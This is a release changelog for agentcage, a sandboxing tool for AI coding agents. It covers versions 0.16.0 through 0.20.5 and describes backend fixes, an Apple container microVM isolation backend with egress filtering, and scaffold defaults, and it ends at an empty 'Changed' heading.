Re-release of 0.20.4 with the actual fixes built in. The 0.20.4 release-prep commit was made against a stale checkout that predated #140 / #141 / #18, then the tag push raced ahead of a force-push attempt — the publish workflow built and uploaded that stale commit (with `version = "0.20.4"` but the buggy code), and the remote tag was later updated to point at the correct commit only on GitHub, not on PyPI. PyPI 0.20.4 has been yanked. 0.20.5 contains the actually-merged code from `master` HEAD plus the version bump.

## [0.20.4] - 2026-05-25 (yanked, see 0.20.5)

Tag was force-updated to the post-#141 commit, but PyPI received the stale pre-#140 wheel from an earlier tag push. The PyPI release has been yanked; install 0.20.5 instead.

The intended 0.20.4 content (now shipping verbatim in 0.20.5) bundled the remaining apple-container regressions blocking `agentcage run ubuntu` on macOS 26+ Apple Silicon, plus a CI-only fix to the release-notes pipeline. `v0.20.3` was tagged but never reached PyPI (cancelled mid-workflow before upload); 0.20.5 supersedes both and is the first apple-container release where the full init → create → exec → apt-get install path works without crashing.

### Fixed
- `agentcage run ubuntu` (and any other apple-container cage on a base image with a built-in uid-1000 user) no longer exits immediately at supervisor stage 90 with `User [cage] not known`. `capsh --user=` resolves by name (via `getpwnam`), and the wrapper Containerfile reuses the image's existing uid-1000 user (`ubuntu` on ubuntu:24.04, `node` on node:*, `claude` on claude-code) without creating a `cage` alias. The supervisor now resolves the uid-1000 name at runtime (`getent passwd 1000 | cut -d: -f1`) and passes it to capsh, so every popular base works. The ubuntu scaffold's `cp /certs/mitmproxy-ca-cert.pem ... && update-ca-certificates` was a secondary blocker — that pair runs as uid 1000 on apple-container and fails with EACCES (the supervisor has already installed the CA at stage 60), so the cage CMD exited non-zero and the container stopped before `sleep infinity` ever ran. Now wrapped in `{ ... } || true; exec sleep infinity` so EACCES is harmless. (#140)
- `agentcage cage exec` / `cage shell` / `cage logs` / `cage verify` / `cage show` / `cage start` / `cage restart` no longer crash with `FileNotFoundError: 'podman'` on apple-container cages on macOS hosts without podman installed. Every subcommand other than `create`/`update`/`list`/`destroy` had a `cfg.isolation == "vm"` branch followed by a fall-through that assumed host podman existed. The fall-through now also gates on apple-container: `exec`/`shell` route through `container exec` (with `-it` autodetect and `--service proxy|dns` rejected with a clear message — proxy and dnsmasq run as in-process supervisors inside the one microVM), `logs` execs `container logs [-f]`, `verify` keeps the backend-agnostic service-status checks and prints an INFO line noting that deeper probes (CA / egress / nested) aren't wired up, `show` replaces the host-podman-backed secret count with an "expected (status not tracked)" line, and `start`/`restart` skip `_ensure_patches(Podman())` + `resolve_and_populate` (no host-podman secret store on apple-container). `audit`/`har`/`backup`/`restore` exit non-zero with `not yet implemented for apple-container backend (see issue #120)` instead of crashing on the first podman call. `_ensure_dns_quadlet_current` and `_update_dns_quadlet` are also gated. (#139)
- `agentcage cage exec ubuntu02 -- apt-get update` (and every other interactive command run as root via `container exec`) no longer times out trying to reach allowlisted upstream hosts. The egress filter's NAT REDIRECT for tcp/80 and tcp/443 only matched the cage workload at uid 1000, but `container exec` enters as the image's default USER — root on every popular base — so root's port-80/443 traffic skipped the proxy entirely and hit the default-DROP filter chain. The REDIRECT now excludes only the egress components (uid 200 = mitmproxy, uid 201 = dnsmasq) so their upstream connections don't loop back; every other uid flows through the proxy + allowlist. Verified: `apt-get update` fetches 23.8 MB from archive.ubuntu.com (allowlisted) in 1s; `curl https://example.com` (not allowlisted) returns 403 from mitmproxy in ~50ms. Also adds `filter-AAAA` to dnsmasq so IPv6 records (which the cage can never reach — v6 is killed at netfilter + sysctl) are stripped at the resolver instead of causing every client to try IPv6 first, hit `Cannot assign requested address`, and fall back to v4. (#141)

### CI
- The release workflow's GitHub Release notes are no longer mangled by shell command substitution. `gh release create --notes "${{ steps.changelog.outputs.notes }}"` was inlining the markdown straight into the shell command line, where bash interpreted backticks (`like this`) as command substitution and silently stripped every code span (v0.20.2's release page shipped with blank gaps where `code` should have been). The notes are now passed via `env: NOTES:` and referenced as `$NOTES`, which keeps the body literal.

## [0.20.3] - 2026-05-25 (tagged, never published)

`v0.20.3` was tagged at `459f97c` covering only #139; the publish workflow was cancelled mid-upload before reaching PyPI. The fix is included verbatim in 0.20.4 alongside #140 / #141 / the CI fix.

## [0.20.2] - 2026-05-25

### Fixed
- `agentcage init <name> --scaffold <scaffold>` on macOS no longer crashes with `FileNotFoundError: [Errno 2] No such file or directory: 'podman'` when the host has no podman installed (the common case on Mac, where image builds happen inside Lima or via Apple's `container` CLI). `run_scaffold_setup` now takes the resolved isolation and only invokes host podman for `isolation: container`; for `vm`/`apple-container` it prints one explanation line and skips the host build loop (the backend still builds images at cage create time). Provision steps always run. Callers that don't pass `isolation` (none in tree) preserve the legacy behavior. (#138)
- `agentcage run ubuntu` (and any other apple-container cage with a `container.command:` in cage.yaml) no longer exits immediately after start. The apple-container backend was resolving the cage's CMD by inspecting the user image's OCI config — for ubuntu that's `/bin/bash`, which exits instantly under `container run -d` with no TTY — completely ignoring cage.yaml's `command:`. cage.yaml now wins; the image's OCI CMD is the fallback only when the cage doesn't set one. Additionally, `supervisor.sh` stage 60 now mirrors the proxy CA into `/certs/mitmproxy-ca-cert.pem` (where the container backend bind-mounts it), so backend-agnostic cage.yaml commands that reference that path Just Work on apple-container without scaffold edits. (#136)
- `agentcage cage create` on the apple-container backend no longer shows two spinners racing on the same terminal line (`⠼ Starting cage...⠹ [1/2] Fetching image [13s]`) during image pull. Apple's `container` CLI writes its own progress to stderr; agentcage's braille `Spinner` writes `\r <frame> <msg>` to the same line every 80 ms; the two writers overdrew each other and flickered. `Spinner` now exposes pause/resume; the streaming branch of `apple_container.cli.run` (capture_output=False) wraps the child `subprocess.run` in a `pause_active_spinner()` context manager, so Apple's CLI owns the terminal line for the duration of the call and our spinner resumes after. Same pattern would help Lima — filed as a separate follow-up. (#137)

## [0.20.1] - 2026-05-24

### Fixed
- `agentcage run claude-code` no longer fails with `failed to exec [claude] Error Domain=NSPOSIXErrorDomain Code=8 "Exec format error"` (ENOEXEC) on the apple-container backend (and any other backend that exec()s the symlinked binary directly). Recent `@anthropic-ai/claude-code` npm releases switched from a JS-with-shebang `claude.exe` to a platform-native binary architecture where `bin/claude.exe` is a no-shebang error stub until the package's own `install.cjs` runs and replaces it with (or symlinks it to) the right `claude-code-linux-<arch>/claude` ELF. The scaffold's `npm install -g --ignore-scripts @anthropic-ai/claude-code` (defense-in-depth against transitive postinstalls) correctly skipped all postinstall hooks — but that also skipped claude-code's own install.cjs, so `claude.exe` stayed as the error stub. The kernel returned ENOEXEC because the stub had no shebang and was not an ELF. Fix: keep `--ignore-scripts` for the broad install, then run `node /usr/local/lib/node_modules/@anthropic-ai/claude-code/install.cjs` explicitly afterward. Defense-in-depth is preserved (transitive postinstalls still don't run); claude-code's own setup runs. Verified on macOS 26.3.2 + ASi: `claude.exe` is now an ELF executable and `claude --version` prints `2.1.150 (Claude Code)`. (#132, #133)

## [0.20.0] - 2026-05-24

Major release introducing the **apple-container** isolation backend on macOS 26+ Apple Silicon, with full security parity with Lima on the threat model that matters (egress allowlist, HTTPS MITM, hardened cage workload). New default on supported hosts; Lima/container backends unchanged. See [Apple Container Isolation](docs/apple-container.md) for the deep dive.

### Added
- New `isolation: "apple-container"` backend for macOS 26+ Apple Silicon, the new default on hosts where Apple's `container` CLI is installed (Lima stays the default on older macOS, Intel, and when `container` is missing; Linux is unchanged). Each cage runs in a single Apple `container` microVM — one kernel per cage with the hypervisor as the trust boundary, ~10-20× faster than Lima warm and ~3× less RAM per cage. The backend wraps the user's cage image with a security-critical supervisor that runs as PID 1 in the microVM and stands up a full egress filter before exec'ing the user's workload: dnsmasq (uid 201) forwards DNS to 1.1.1.1/8.8.8.8, mitmproxy (uid 200, official PyInstaller bundle pinned by SHA256) listens transparent on 127.0.0.1:8080, the mitmproxy CA is installed in the cage's trust store, and iptables REDIRECTs the cage's tcp/80 + tcp/443 to mitmproxy while DROPing everything else (IPv6 is killed at netfilter + sysctl so AAAA records can't bypass v4 NAT). A small mitmproxy addon enforces the cage's `domains.allow` list — non-listed requests get a 403 from the proxy, the upstream connection is never opened. The cage workload then runs as uid 1000 with `CapEff/Prm/Inh/Bnd` all zero, `NoNewPrivs=1`, and `hidepid=2` shielding it from other UIDs' processes. Two verification spikes documented in #120 grounded the design (Apple `container` 0.12.3 does not support multi-network attach; hardening primitives require `--cap-add CAP_SYS_ADMIN` for the supervisor to remount `/proc` and set up the egress filter). End-to-end verified on macOS 26.3.2 + Apple Silicon: allowlisted domains return 200, blocked return 403 from the proxy, raw IP literals return 403, non-80/443 ports + UDP DNS bypass timeout at iptables DROP, cage user cannot `iptables -F` or reach arbitrary loopback services. `agentcage doctor` reports apple-container readiness alongside Lima. User images must be glibc-based (debian/ubuntu) because the bundled mitmproxy is glibc-only; alpine/musl support is a v2 follow-up. Also deferred: server-side `{{SECRET:...}}` placeholder injection, `agentcage cage audit` integration with the proxy log, and the Backend protocol lift for `exec`/`logs`/`audit`. (#125)
- New [Apple Container Isolation](docs/apple-container.md) docs page covering architecture, prerequisites, security model, deferred follow-ups, and troubleshooting. README and configuration reference updated to mention the third backend; security & threat model docs gain a third column comparing apple-container to container/vm across all threat dimensions.
- `install.sh` auto-installs Apple's `container` CLI on macOS 26+ Apple Silicon and starts the apiserver (with `--enable-kernel-install`). Lima becomes optional on those hosts (still installed on demand via `--with-lima`). Older macOS / Intel Macs continue to install Lima automatically.

### Fixed
- Minimal distro scaffolds (busybox / alpine / arch / ubuntu / debian) shipped in 0.17.8 didn't quite work out of the box: the cage ran as UID 1000 (no real user in any minimal base image, so `whoami` returned nothing and the prompt only showed `luca` because `$USER` bled through `podman exec`), the empty `domains.allow` meant package mirrors were blocked, no `add_capabilities` meant the package manager couldn't drop to its helper user (`_apt` etc.), and arch/ubuntu/debian's `pacman`/`apt` didn't read `SSL_CERT_FILE` so the MITM proxy CA was untrusted. All four package-manager scaffolds now run as root, pre-allowlist the distro's package mirrors, re-add the minimum capabilities (`CHOWN`, `FOWNER`, `DAC_OVERRIDE`, `SETUID`, `SETGID`) for package install, and (where the package manager doesn't honor `SSL_CERT_FILE`) install the agentcage MITM proxy CA into the system trust store at container startup. Verified end-to-end on every distro: `apk add curl` / `pacman -S curl` / `apt-get install -y curl` all succeed against the real upstream mirrors. busybox is unchanged — `busybox:latest` ships no package manager, so its README now documents the limitation and points users to alpine. "for testing agentcage primitives" stripped from all 15 description sites. (#130)

## [0.17.8] - 2026-05-24

### Added
- Five minimal base-image scaffolds — `busybox`, `alpine`, `arch`, `ubuntu`, `debian` — intended for testing agentcage primitives without the noise of a coding agent. Each is `FROM docker.io/library/<base>:latest` (debian uses `stable-slim`) with `WORKDIR /workspace` and nothing else — no apt/apk installs, no extra tools. The cage starts under `interactive` lifecycle with `sleep infinity` and an exec alias for the appropriate shell (`sh` for busybox/alpine, `bash` for arch/ubuntu/debian). Defaults are deliberately tight: empty `domains.allow` (every outbound request blocked until you add hosts), no active `secret_injection` rules, no `cap_add` in the scaffold's build step (the FROM + WORKDIR build needs zero capabilities), 1 GiB / 1 CPU container limits, 2 vcpu / 2 GiB VM. Auto-discovered by `list_scaffolds()` — no Python changes; both isolation modes render and validate clean. (#129)

## [0.17.7] - 2026-05-24

### Added
- New built-in `pi` scaffold for the [Pi.dev terminal coding harness](https://pi.dev/docs/latest). `agentcage init <name> --scaffold pi` produces a cage that pre-installs Pi (`@earendil-works/pi-coding-agent`) on `node:22-slim`, mounts `~/.pi` for persistent `/login` credentials and session state, and pre-injects `ANTHROPIC_API_KEY` via proxy placeholder substitution. `agentcage run pi` short form supported via the scaffold's exec alias. Container and VM isolation both rendered + validated. Pi-specific details: `pi.dev` allowlisted for update + auth endpoints; `fd-find` pre-installed and symlinked to `/usr/local/bin/fd` so Pi finds the system binary on startup instead of fetching it from `api.github.com/repos/sharkdp/fd/releases/latest`. (#124)

### Changed
- All three coding-agent scaffolds (`claude-code`, `codex`, `pi`) now share consistent defaults:
  - `fd-find` pre-installed + `fdfind` → `fd` symlink in every Containerfile. Without this, all three agents fetch `fd` from GitHub releases at startup (blocked by the default allowlist).
  - `npm install -g` now runs with `--ignore-scripts` at image-build time. Defense-in-depth: skips npm postinstall hooks; runtime package code is unaffected.
  - Package-registry domains (`npmjs.org`, `npmjs.com`, `pypi.org`, `files.pythonhosted.org`, `nodejs.org`) are commented out by default in `cage.yaml.j2`. Agent deps are baked in at image-build time, so the running cage doesn't need access to public package indexes. Users who run `npm install` / `pip install` in `/workspace` uncomment the relevant lines.
- `claude-code` scaffold: telemetry domains (`datadoghq.com`, `githubusercontent.com`, `sentry.io`) are commented out by default. Preferred fix for the "claude hangs at splash" issue is `"telemetry": "disabled"` in `~/.claude/settings.json`; the allowlist entries become an opt-in fallback. README troubleshooting section updated.
- `claude-code` scaffold: `~/.claude.json` volume mount removed from the default. Auth tokens live in `~/.claude/.credentials.json` and are still covered by the `~/.claude` mount; only the global UX config (model choice, theme, etc.) was carried by the file mount. Commented-out so users can re-enable if they want host preferences to follow them into the cage.
- `codex` scaffold: container resources bumped from 2 GiB / 2 CPUs to 8 GiB / 4 CPUs, VM from 2 vcpu / 4 GiB to 4 vcpu / 8 GiB. Matches `claude-code` and `pi`. Coding agents are memory-hungry; old defaults pushed real workloads against the limit. (#128)

## [0.17.6] - 2026-05-24

### Fixed
- `agentcage cage update <name>` no longer regenerates quadlets with a fresh network octet that doesn't match the existing `<name>-net` podman network. On a single-cage system the hash-based allocator could land on a different octet at update time than at create time (because the cage being updated was excluded from the "used" set, so create-time collision resolution didn't reproduce), causing the DNS sidecar to fail at start with `Error: requested static ip 10.89.X.10 not in any subnet on network <name>-net` and cascading to the cage + proxy as dependency failures. `cage update` now reads the persisted `network_octet` from the cage's `metadata.json` and pins the subnet to the original allocation. The fix threads a new `network_octet` parameter through `build_and_deploy → generate_units → generate_quadlets → cage_network_addrs`; when set, it bypasses hash-based allocation entirely. New regression tests in `test_cage_cli.py` cover the CLI, the renderer, and the `services.build_and_deploy` plumbing. (#126)

## [0.17.5] - 2026-05-24

### Fixed
- `agentcage cage create` and `agentcage run` against a fresh Lima VM no longer wedge during cloud-init provisioning. The provision script called `loginctl enable-linger "$lima_user"`, which goes through systemd-logind over D-Bus; after the preceding `usermod -aG systemd-journal/adm` against the already-active Lima SSH user, that dbus call has been observed to time out at 25 s, after which logind sits at ~100 % CPU and every later `pam_systemd(sshd:session)` fails with `Connection timed out`. The agentcage `bridge_secrets` step's `podman secret rm` over SSH then falls back to the system bus and futex-deadlocks for tens of minutes before returning. The provision script now writes logind's linger sentinel file directly (`mkdir -p /var/lib/systemd/linger && touch /var/lib/systemd/linger/$lima_user`) — same end state as `loginctl enable-linger`, no dbus round-trip, can't wedge. New regression test in `test_lima_provisioning.py` asserts no `loginctl` invocation in the rendered script. (#123)

## [0.17.4] - 2026-05-24

### Added
- `--time` flag on `agentcage cage create` and `agentcage run` (both isolation backends) records each phase of cage creation into a per-cage JSONL ledger at `~/.local/share/agentcage/<cage>/timings/` and prints a phase/ms/% summary table on completion (success or failure). When the flag is set (or `AGENTCAGE_TIMING=1` is exported), each phase also echoes `[timing] <label>: <ms>ms` to stderr as it exits. Default is silent. Phases instrumented: `lima.create`, `lima.start`, `copy.build_context`, `build.proxy`, `build.dns`, `pull.cage` / `build.cage`, `deploy.quadlets`, `deploy.bridge_secrets`, `deploy.pending_secrets`, `systemd.start`, `systemd.wait_proxy`, `systemd.start_cage`. The ledger files rotate at 20 per cage; timing-path errors are swallowed so instrumentation never breaks the code it wraps. (#118)

### Performance
- The Lima VM's provisioning script (`provision.sh.j2`) now invokes `apt-get install` with `--no-install-recommends`, cutting ~50 MB of unused dependencies (mail-transport-agent and friends) from the fresh Ubuntu cloud image. `socat` is also dropped from the install list — it was never referenced by any agentcage code path. Core deps (`podman`, `fuse-overlayfs`, `uidmap`, `slirp4netns`, `iptables`) remain. Smaller disk footprint, faster `apt-get install` on every cold VM. (#119)
- The hardcoded 5-second `time.sleep` between starting infra systemd services inside the Lima VM and verifying their state is replaced with an active poll (`_wait_infra_active`, `vm.py`) that ticks every 100 ms with the same 5-second deadline. Warm restarts where services come up in milliseconds now finish that phase in sub-second instead of waiting the full 5 s. Cold runs are unchanged — same effective deadline, same retry path. (#119)
- The mitmproxy readiness poll is converted from iteration-count to a `time.monotonic()` deadline, and `PROXY_READINESS_POLL_INTERVAL_S` is tightened from 1.0 s to 0.25 s. The 30-second timeout is preserved while polling 4× more often; median proxy-ready wait shrinks by up to ~0.75 s. (#119)

Measured on a fresh M1 Mac (alpine sleep-infinity cage, Ubuntu cloud image cached): `agentcage cage create --time` reports a 43.4-second wall time, with `systemd.start` consistently 1.3–2.4 s (was a flat 5 s) and `systemd.wait_proxy` at 41 ms.

## [0.17.3] - 2026-05-22

### Fixed
- `agentcage cage rm` on macOS no longer aborts mid-cleanup with `FileNotFoundError: 'systemctl'`, which leaked the cage's podman network, volumes, and scoped secrets. The container backend's `destroy_resources()` calls `systemd.daemon_reload()` unconditionally, but macOS has no `systemctl`. The four public functions in `systemd.py` (`daemon_reload`, `start_unit`, `stop_unit`, `restart_unit`) now check `shutil.which("systemctl")` and become no-ops when it is absent, so cleanup runs to completion on hosts without systemd.
- `agentcage cage audit` and `cage logs` on a VM-backend cage no longer print `No journal files were opened due to insufficient permissions` and return nothing. Two causes, both in `cli.py`: the proxy/dns quadlets run as `systemd --user` units but conmon routes their container output to the *system* journal, so `journalctl --user -u` matched nothing — the commands now filter with `--user-unit`. And Lima establishes its persistent SSH ControlMaster before provisioning adds the VM user to the `systemd-journal` group, so the reused SSH session inherits stale groups and cannot read `system.journal`; the `journalctl` invocation is now wrapped in `sg systemd-journal -c` to re-fetch the group. No re-provisioning is required — the fix works on already-running VM cages.

## [0.17.2] - 2026-05-22

### Added
- Single-file volume sources now work on the VM backend. Lima's virtiofs can only share directories, so a volume like the claude-code scaffold's `~/.claude.json` previously could not be carried into a VM cage (v0.17.1 just skipped it). `generate_quadlets` now stages a copy of any file-source volume into `~/.local/share/agentcage/<cage>/seed/` — a directory Lima already mounts — and bind-mounts the staged copy. The claude-code cage on macOS therefore starts with Claude Code's global config (`~/.claude.json`) in place. The staged copy is one-way: the cage reads and may write it, but changes do not flow back to the host file; re-staging on every deploy keeps the seed current. The container backend is unchanged — it bind-mounts single files directly.
- The `claude-code` scaffold ships a (commented-out) `CLAUDE_CODE_OAUTH_TOKEN` secret-injection rule for subscription auth without an in-cage `claude login`. On macOS `claude login` stores credentials in the Keychain, which a Linux cage cannot read; mint a long-lived token on the host with `claude setup-token`, `agentcage secret set <cage> CLAUDE_CODE_OAUTH_TOKEN`, and uncomment the rule. The proxy swaps the placeholder for the real token en route to `anthropic.com`, so it never enters the cage. The rule is commented out by default because an active injection rule makes `cage create` require the secret. Scaffold README and `cage.yaml` header updated with the three auth options.
- `agentcage run claude-code` now preflights authentication. If `CLAUDE_CODE_OAUTH_TOKEN` is set in the environment it is wired in automatically — the injection rule is added and the token staged, no `-s` flag or config edit needed. If no auth path is found at all (no token, no `-s` secret, no `~/.claude/.credentials.json` from a prior in-cage login) the command exits with `claude setup-token` instructions instead of dropping the user into an unauthenticated Claude Code session.

### Changed
- The `claude-code` scaffold now defaults to larger resources: the Lima VM gets 4 vCPUs / 8 GiB (was 2 / 4 GiB) and the cage container limits are raised to 4 CPUs / 8 GiB (was 2.0 / 2 GiB). Coding agents are memory-hungry — builds, language servers, and large repos pushed the old 2 GiB container limit. Both values are still plain scaffold defaults; edit `cage.yaml` to tune them per cage.

### Fixed
- Claude Code (and any interactive cage TUI) on the VM backend no longer needs every keystroke pressed twice. The proxy-log monitor spawned `podman logs -f` without detaching stdin; on the VM backend that command is wrapped in `limactl shell` → `ssh`, and `ssh` reads its inherited stdin to forward to the remote side. With the interactive `podman exec -it` session sharing the same controlling terminal, two `ssh` processes raced for the user's keystrokes and roughly half were swallowed by the log monitor. The monitor's subprocess now runs with `stdin=subprocess.DEVNULL`. The container backend was unaffected because `podman logs` runs there directly, with no `ssh` in the path.

## [0.17.1] - 2026-05-21

### Fixed
- `agentcage run claude-code` (and any VM-isolation cage with a single-file volume) no longer aborts with `limactl create` fatal `field mounts[N].location refers to a non-directory path`. The claude-code scaffold mounts `~/.claude.json` — a single file — but Lima's virtiofs can only share directories. The Lima-config generator emitted the file as a `mounts[].location` anyway, so `limactl create` rejected the whole config and the cage never built. `_extra_mounts_for_volumes` now skips volume sources that are not directories (with a warning), and `generate_quadlets` drops the matching bind-mount on the VM backend so the cage still starts without it. The container backend is unaffected — podman bind-mounts single files directly, so `~/.claude.json` is still shared there.

## [0.17.0] - 2026-05-21

### Changed
- `agentcage doctor` no longer includes a "Cages" section. Per-cage health (running / stopped / orphaned) duplicated `agentcage cage list`, which has richer output; `doctor` now focuses solely on whether the system itself is ready.

### Removed
- `agentcage update` self-update command. Use `uv tool upgrade agentcage` or `pipx upgrade agentcage` instead — package managers do PyPI polling, installer detection, and version comparison better than a duplicated CLI surface.
- `agentcage secret migrate` subcommand. Cross-backend migration was a one-time op for users predating the systemd-creds default; the replacement is the documented "Migrating between secret backends" recipe in `docs/configuration.md` (re-set secrets after editing `secret.backend` in `cage.yaml`).
- `alpine-curl` scaffold — curl-test demo with no agent surface.
- `nanoclaw` scaffold — mirrored upstream nested-container framework; drifted from upstream and forced agentcage to track upstream container layout. Anyone using it can fork the scaffold dir from a previous release.
- `picoclaw` scaffold — mirrored upstream lightweight gateway; same drift story. Anyone using it can fork the scaffold dir from a previous release.

### Fixed
- The proxy quadlet's `systemd-creds decrypt` step now passes `--name`. `agentcage secret set` encrypts each `.cred` with `--name <ENV>`, but the proxy's `ExecStartPre` decrypted it without `--name` — and because the decrypted value is piped to stdout, `systemd-creds` could not derive the expected credential name from the output path and rejected the credential with `Name in credential doesn't match expectations` (exit 125). Any cage with a secret on the systemd-creds backend (the default) failed to start its proxy, and since the cage depends on the proxy the whole cage went down. The decrypt now passes `--name "<ENV>"` so it matches what `secret set` encrypted.
- `agentcage run` no longer hangs on a hidden Lima prompt when it has to create the VM. `limactl create` shows an interactive "Proceed with the current configuration / Open an editor / Choose another template / Exit" survey whenever a TTY is attached, and agentcage's "Starting cage..." spinner was drawn on top of it — so the first interactive `agentcage run` on a fresh machine appeared to hang forever on the spinner. `LimaInstance.create()` now passes `--yes` to `limactl create`, which skips the survey. Headless runs were unaffected because Lima auto-proceeds when there is no TTY, which is also why this slipped through.
- `agentcage cage start` (and `cage restart` / domain edits) no longer crash with an unhandled `limactl` traceback on a stopped VM cage. `_ensure_dns_quadlet_current` — the DNS-quadlet migration safety check — execs *inside* the Lima VM, but ran before the VM was started. On a VM-isolation cage that had been stopped (the normal state after `agentcage run` exits), the `limactl shell` call failed and surfaced as a raw `subprocess.CalledProcessError`, leaving "run → exit → resume" broken on macOS. The check now no-ops when the VM is not running; the VM backend reinstalls every quadlet from the host config dir when the VM next starts, so nothing is lost.
- `install.sh` no longer aborts Homebrew bootstrapping on a genuinely fresh Mac. The installer runs the Homebrew installer with `NONINTERACTIVE=1` so it does not block on prompts when piped from `curl`, but in that mode Homebrew probes sudo with `sudo -n` and never prompts — so on a fresh Mac with no cached sudo credentials Homebrew aborted with "Need sudo access on macOS" even though the user is an administrator. `install.sh` now primes the sudo credential cache with one `sudo -v` prompt before invoking Homebrew, and fails with an actionable message if sudo cannot be obtained.
- `cage update` (without `-c`) no longer breaks rebuilds for cages whose Containerfile `COPY`s a directory tree. The build-context staging step copied sibling *files* into the cage state dir but skipped sibling *directories*, so a bare `cage update` — which rebuilds from the state dir — could not reproduce a build context that `cage update -c` (which builds from the original config dir) handled fine. The rebuild then failed inside `podman build` with `copier: stat: "...": no such file or directory`, and because the cage container is removed during the update the cage was left `stopped`. Staging now copies directories as well as files (skipping `__pycache__`, `.git`, `node_modules` and soft-deleted leftovers), across all four sites that snapshot a build context: `cage create`, `cage update -c`, `cage update`'s scaffold refresh, and scaffold init.

## [0.16.1] - 2026-05-20

### Fixed
- The `openclaw` scaffold's nested container pulls work again. `podman run` inside the cage failed pulling an image because Docker Hub serves image blobs from a CDN host (`production.cloudfront.docker.com`) the scaffold's domain allowlist did not cover — the cage proxy returned 403. The allowlist now permits `docker.io` and `docker.com` with all subdomains, covering the registry, the token service, and whichever CDN edge Docker Hub redirects blob downloads to.
- The Shannon-entropy inspector is no longer enabled by default in the built-in scaffolds. It is already globally opt-in (it false-positives on legitimate high-entropy data — auth tokens, content digests, compressed payloads), but every scaffold's `cage.yaml` re-enabled it, which is the wrong default. Add `- name: entropy` under `inspectors:` to turn it back on for a cage that wants it.
- The `openclaw` scaffold Containerfile's `/etc/subuid` and `/etc/subgid` setup is now idempotent. Recent openclaw base images ship a `node` entry of their own; appending another created a duplicate overlapping subuid range, which `newuidmap` rejects. The entry is now added only when one is missing.
- `install.sh` now bootstraps Homebrew on macOS instead of aborting with `error: Homebrew is required` when it is missing. Homebrew is itself a prerequisite, so a genuinely fresh Mac could never run the documented one-line installer. The installer now installs Homebrew non-interactively, and also picks up an existing Homebrew that is installed but not yet on `PATH`.
- `agentcage doctor` is now macOS-aware. It no longer reports a fistful of bogus errors and warnings on a healthy macOS install: QEMU, systemd linger and cgroup v2 checks (all Linux-only) are skipped, a missing host Podman is reported as optional rather than an error, and the secret-store and Lima hints no longer recommend Linux-only remediation (`systemd 250+`, distro package managers). A missing Lima *is* reported as an error on macOS (the VM is the only isolation mode there, so without it nothing can run), and the macOS secret-store check probes for Podman instead of assuming it is installed.
- The Lima VM image is now pinned to an immutable dated URL (`.../releases/24.04/release-20260321/...`) instead of the mutable `.../release/` symlink. Ubuntu republishes the 24.04 point release in place, which changed the image bytes out from under the pinned SHA-256 digests and made `agentcage run` fail fatally with a Lima digest mismatch. Both digests were also refreshed to match.
- `agentcage run` no longer hangs for ten minutes and then fails with `Build failed` on macOS. The generated Lima config carried mount entries pointing at host paths that did not exist: `${PROJECT_DIR}` was never expanded (only `~` was), the scaffold's optional `~/.claude` / `~/.claude.json` mounts are absent on a fresh machine, and a hardcoded `/tmp/lima` mount likewise. Lima only *warns* about a missing mount source, but the VM then never finishes starting — it wedges at the SSH requirement until the 10-minute timeout. `_extra_mounts_for_volumes` now expands `${VARS}` as well as `~`, and skips any host path that does not exist; the unused hardcoded `/tmp/lima` mount was removed.
- The Lima provisioning script no longer assumes the guest user is named `lima`. Lima 2.x names the guest user after the host user; agentcage runs `limactl` as that user, so the host username is templated into the provision script at config generation. Previously `loginctl enable-linger lima` (run under `set -euo pipefail`) would abort provisioning against a non-existent account. (The username is templated rather than read from `$LIMA_CIDATA_USER` at run time because Lima 2.x warns against referencing those variables from provisioning scripts.)
- The cage container no longer fails to start when an optional bind-mount source is missing. The claude-code scaffold mounts `~/.claude` and `~/.claude.json` for auth persistence, but on a fresh machine those do not exist — podman then failed the cage with `statfs ...: no such file or directory` (exit 125). Quadlet generation now skips `Volume=` entries whose host path does not exist (or still contains an unresolved `${VAR}`), consistent with the Lima-mount handling.
- `agentcage run`'s interactive session now works on the VM backend. The final step that execs the agent into the cage — and the proxy-log monitor — invoked host `podman` directly, which does not exist on macOS (Podman runs inside the Lima VM), so `agentcage run` crashed with `FileNotFoundError: 'podman'`. Both now route through `limactl shell` when the cage uses VM isolation.
- `agentcage run` now creates a cage's missing bind-mount directories before starting it. The claude-code scaffold mounts `~/.claude` so that signing in once (`claude login`) carries over to later runs — but on a fresh machine that directory does not exist yet, so it was skipped and the login never reached the host, leaving you to re-authenticate every run. Missing volume directories are now created up front, so a login persists from the first run.
- `agentcage run --set-secret KEY=VALUE` now works on macOS. Secret population called host Podman directly, which does not exist on the VM backend, so `agentcage run -s ...` crashed before the cage started. `--set-secret` values are now staged for the VM backend to create inside the VM — the same path `agentcage cage create` already uses for VM cages.

## [0.16.0] - 2026-05-15

### Added
- `secrets.scope` config field (`auto` | `user` | `system`, default `auto`) selects which systemd-creds key encrypts a cage's secrets. `auto` picks `user` when the invoker is non-root and `systemd-creds --user encrypt` probes successfully, else falls back to `system`. Motivating case: when a service user like `jacque-svc` runs `agentcage secret set NAME KEY` on a host with an active graphical session, the system-scope `io.systemd.credentials.encrypt` polkit action is routed to the desktop user's polkit agent and prompts for their password — which the unattended service user can't satisfy. User-scoped encryption uses the per-user key under `~/.config/credstore/` and bypasses polkit entirely. The .cred files are encrypted/decrypted with the same scope; quadlets already run under `systemctl --user`, so a user-scoped blob decrypts cleanly in the proxy `ExecStartPre`. `encrypt_secret(name, value, state_dir, scope=...)`, `resolve_scope(configured)`, and `detect_default_scope()` are the new public knobs; `agentcage doctor` reports the selected scope (and warns that user-scoped blobs are bound to the user rather than the host's TPM/hardware).
- `host_url_param_allowlist` now accepts the wildcard entry `"*"` to disable URL entropy checks entirely for a host. A list containing the single value `"*"` short-circuits both `_check_url_params` and `_check_url_path` for the matched host (and its subdomains, matching the existing suffix logic), so neither query-param values nor path segments are entropy-scanned. Motivating case: hosts like `googleapis.com` legitimately emit many opaque high-entropy continuation cursors (Drive `pageToken`, Calendar `syncToken`, plus future tokens we haven't seen yet) and maintaining an explicit param-name list is fragile — every new Google API surface that ships a new cursor name re-blocks the cage until the operator names it. The wildcard is one knob: `host_url_param_allowlist: {"googleapis.com": ["*"]}` covers params and path segments together. Body entropy is unchanged; this only relaxes the URL-side checks.

### Changed (BREAKING — security-relevant default)
